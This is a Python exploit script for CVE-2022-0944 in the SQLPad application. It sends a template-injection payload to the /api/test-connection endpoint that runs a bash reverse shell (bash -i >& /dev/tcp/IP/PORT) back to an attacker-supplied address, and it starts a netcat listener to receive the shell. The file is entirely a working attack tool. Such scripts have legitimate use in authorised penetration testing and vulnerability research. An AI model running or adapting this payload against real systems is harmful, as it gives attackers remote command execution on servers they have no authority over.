#!/usr/bin/env python3

import argparse
import requests
import os
import threading

def sanitize_url(url):
    """
    Sanitize the provided URL to ensure it starts with 'http://' or 'https://',
    and remove any trailing slashes at the end.
    """
    if not url.startswith('http://') and not url.startswith('https://'):
        # If the URL doesn't start with either http:// or https://, add http:// by default
        url = 'http://' + url

    # Remove any trailing '/' at the end of the URL
    if url.endswith('/'):
        url = url.rstrip('/')

    return url

def start_listener(port):
    """
    Function to start a Netcat listener on the specified port.
    This listener will be used to receive the reverse shell.
    """
    os.system(f"nc -nlvp {port}")  # Use os.system to run the netcat listener

def main():
    # Argument parser for handling input arguments from the command line
    parser = argparse.ArgumentParser(description="CVE-2022-0944 RCE Exploit")

    # Define required arguments: URL (target), IP (attacker's IP), and PORT (attacker's port)
    parser.add_argument('URL', help="URL of the SQLPad application")
    parser.add_argument('IP', help="Attacker IP address for the reverse shell")
    parser.add_argument('PORT', help="Attacker PORT for the reverse shell")

    args = parser.parse_args()

    # Sanitize the input URL to ensure it is properly formatted
    sanitized_url = sanitize_url(args.URL)

    # Construct the full URL to send the POST request (targeting the API endpoint)
    URL = f"{sanitized_url}/api/test-connection"

    # The payload to execute a reverse shell using bash
    payload = f"{{{{ process.mainModule.require('child_process').exec('/bin/bash -c \"bash -i >& /dev/tcp/{args.IP}/{args.PORT} 0>&1\"') }}}}"

    # Headers for the HTTP POST request
    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
    }

    # JSON body to be sent in the POST request
    data = {
        "name": "CVE",
        "driver": "mysql",
        "data": {
            "database": payload
        },
        "database": payload
    }

    # Start the Netcat listener in a separate thread
    listener_thread = threading.Thread(target=start_listener, args=(args.PORT,))
    listener_thread.start()

    try:
        # Send the exploit via a POST request to the target URL
        response = requests.post(URL, headers=headers, json=data)
    except Exception as e:
        # Handle any exceptions (e.g., connection errors)
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
